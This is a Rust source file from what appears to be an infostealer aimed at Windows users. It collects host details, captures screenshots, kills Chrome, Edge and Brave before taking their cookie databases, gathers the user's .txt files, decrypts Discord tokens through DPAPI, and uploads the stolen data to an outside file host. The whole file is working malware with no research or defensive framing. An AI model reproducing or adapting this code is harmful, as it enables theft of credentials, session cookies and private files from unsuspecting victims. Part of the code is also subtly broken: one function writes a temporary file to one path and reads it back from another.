use base64::Engine;
use mac_address::get_mac_address;
use regex::bytes::Regex;
use reqwest::multipart;
use screenshots::Screen;
use std::ffi::OsString;
use std::fs;
use std::io::Cursor;
use std::path::PathBuf;
use tokio::fs::File;
use tokio::io::AsyncWriteExt;
use windows::Win32::Security::Cryptography::CRYPT_INTEGER_BLOB;
use windows::Win32::Security::Cryptography::CryptUnprotectData;

use crate::utils::discord;
use crate::utils::process::find_and_kill_process;

pub fn get_host() -> OsString {
    return gethostname::gethostname();
}

pub async fn get_ip() -> Result<String, Box<dyn std::error::Error>> {
    let client = reqwest::Client::new();

    let resp = client.get("https://api.ipify.org").send().await?;
    let text = resp.text().await?;
    Ok(text.trim().to_string())
}

pub fn get_mac() -> String {
    if let Ok(Some(mac)) = get_mac_address() {
        let mac_string: String = mac.to_string();
        return mac_string;
    } else {
        return "Failed to get MAC address".to_string();
    }
}

pub async fn screenshot_desktop_and_upload() -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let screens = Screen::all()?;

    let client = reqwest::Client::builder()
        .http1_only()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        .build()?;

    let mut urls = Vec::new();

    for screen in screens {
        let image = screen.capture()?;
        let mut png_bytes: Vec<u8> = Vec::new();

        image.write_to(
            &mut Cursor::new(&mut png_bytes),
            screenshots::image::ImageFormat::Png,
        )?;

        if png_bytes.is_empty() {
            continue;
        }

        let form = multipart::Form::new().text("reqtype", "fileupload").part(
            "fileToUpload",
            multipart::Part::bytes(png_bytes)
                .file_name("screenshot.png")
                .mime_str("image/png")?,
        );

        let resp = client
            .post("https://catbox.moe/user/api.php")
            .multipart(form)
            .send()
            .await?;

        let status = resp.status();
        let text = resp.text().await?;

        if status.is_success() && !text.is_empty() {
            urls.push(text.trim().to_string());
        } else {
            return Err(format!("Upload failed: {} - {}", status, text).into());
        }
    }

    Ok(urls)
}

pub async fn grab_cookies() -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let mut urls = Vec::new();

    let chrome: PathBuf = "Google/Chrome/User Data/Default/Network/Cookies".into();
    let edge: PathBuf = "Microsoft/Edge/User Data/Default/Network/Cookies".into();
    let brave: PathBuf = "BraveSoftware/Brave-Browser/User Data/Default/Network/Cookies".into();

    let mut full_paths: Vec<PathBuf> = Vec::new();

    if let Some(base) = dirs::data_local_dir() {
        let p = vec![chrome, edge, brave];

        for path in p {
            full_paths.push(base.join(path));
        }
    }

    let processes = vec!["chrome.exe", "msedge.exe", "brave.exe"];

    for p in processes {
        find_and_kill_process(p);
    }

    let client = reqwest::Client::builder()
        .http1_only()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        .build()?;

    for path in &full_paths {
        if path.exists() {
            let cookies = path.file_name().unwrap().to_string_lossy();

            let file_bytes = fs::read(&path)?;

            let form = multipart::Form::new().text("reqtype", "fileupload").part(
                "fileToUpload",
                multipart::Part::bytes(file_bytes)
                    .file_name(cookies.to_string())
                    .mime_str("application/octet-stream")?,
            );

            let resp = client
                .post("https://catbox.moe/user/api.php")
                .multipart(form)
                .send()
                .await?;

            let status = resp.status();
            let text = resp.text().await?;

            if status.is_success() && !text.is_empty() {
                urls.push(text.trim().to_string());
            } else {
                return Err(format!("Upload failed: {} - {}", status, text).into());
            }
        } else {
            continue;
        }
    }

    Ok(urls)
}

pub async fn grab_txts() -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let mut txt_paths: Vec<PathBuf> = Vec::new();
    let mut url: Vec<String> = Vec::new();

    let mut combined_txt =
        File::create(dirs::cache_dir().expect("No cache directory found")).await?;

    // create path
    let mut combined_txt_path: PathBuf = dirs::cache_dir().expect("No cache directory found");
    combined_txt_path.push("combined.txt");

    let base_dirs = vec![
        dirs::home_dir(),
        dirs::download_dir(),
        dirs::document_dir(),
        dirs::desktop_dir(),
        dirs::video_dir(),
        dirs::data_dir(),
    ];

    for dir in base_dirs {
        if let Some(dir) = dir {
            for entry in fs::read_dir(&dir)? {
                if let Ok(entry) = entry {
                    if entry.file_type()?.is_file() {
                        txt_paths.push(entry.path());
                    }
                }
            }
        }
    }

    for txt in txt_paths {
        if let Some(ext) = txt.extension() {
            if ext == "txt" {
                if let Ok(contents) = fs::read_to_string(&txt) {
                    if !contents.is_empty() {
                        combined_txt.write_all(contents.as_bytes()).await?;
                    }
                }
            }
        }
    }

    let file_bytes = fs::read(&combined_txt_path)?;

    let client = reqwest::Client::builder()
        .http1_only()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        .build()?;

    let form = multipart::Form::new().text("reqtype", "fileupload").part(
        "fileToUpload",
        multipart::Part::bytes(file_bytes)
            .file_name("combined.txt")
            .mime_str("application/octet-stream")?,
    );

    let resp = client
        .post("https://catbox.moe/user/api.php")
        .multipart(form)
        .send()
        .await?;

    let status = resp.status();
    let text = resp.text().await?;

    if status.is_success() && !text.is_empty() {
        url.push(text.trim().to_string());
    } else {
        return Err(format!("Upload failed: {} - {}", status, text).into());
    }

    Ok(url)
}

pub async fn grab_discord_token() -> Option<Vec<String>> {
    pub async fn search() -> Vec<String> {
        let mut ldbs = Vec::<Vec<u8>>::new();
        let mut crypt_key = String::new();
        let mut dpapi_key = Vec::<u8>::new();
        let mut aes_key = Vec::new();

        let appdata = dirs::data_dir().unwrap_or_default();

        let mut dc_path = PathBuf::from(appdata);
        dc_path.push("discord");

        let mut token_path = dc_path.clone();
        token_path.push("Local Storage");
        token_path.push("leveldb");

        let mut key_path = dc_path.clone();
        key_path.push("Local State"); // file w encryption key

        if let Ok(mut file) = File::open(&key_path).await {
            crypt_key = discord::get_key(key_path);
        }

        if crypt_key.len() > 0 {
            let encrypted_key = base64::engine::general_purpose::STANDARD
                .decode(crypt_key)
                .expect("failed to decrypt key");

            dpapi_key = encrypted_key[5..].to_vec();

            let mut input = CRYPT_INTEGER_BLOB {
                cbData: dpapi_key.len() as u32,
                pbData: dpapi_key.as_mut_ptr(),
            };

            let mut output = CRYPT_INTEGER_BLOB::default();

            unsafe {
                CryptUnprotectData(&input, None, None, None, None, 0, &mut output)
                    .expect("Failed to decrypt DPAPI key");
                aes_key =
                    std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
            }
        }

        if !dc_path.exists() {
            return Vec::new();
        }

        let entries = fs::read_dir(token_path).unwrap();

        for entry in entries {
            let entry = entry.unwrap();
            let path = entry.path();
            let ext = path.extension().and_then(|s| s.to_str()).unwrap_or("");

            if ext == "ldb" || ext == "log" {
                if let Ok(content) = std::fs::read(&path) {
                    let pattern = b"dQw4w9WgXcQ";
                    if content
                        .windows(pattern.len())
                        .any(|window| window == pattern)
                    {
                        ldbs.push(content);
                    }
                }
            }
        }

        let re = Regex::new(r#"dQw4w9WgXcQ:[^" ]+"#).unwrap();

        for file_content in &ldbs {
            for mat in re.find_iter(file_content) {
                let encrypted_blob = mat.as_bytes();

                if let Ok(token_str) = std::str::from_utf8(encrypted_blob) {
                    let decrypted = discord::decrypt_token(&aes_key, token_str.as_bytes());
                    return vec![decrypted];
                }
            }
        }
        Vec::new()
    }

    Some(search().await)
}
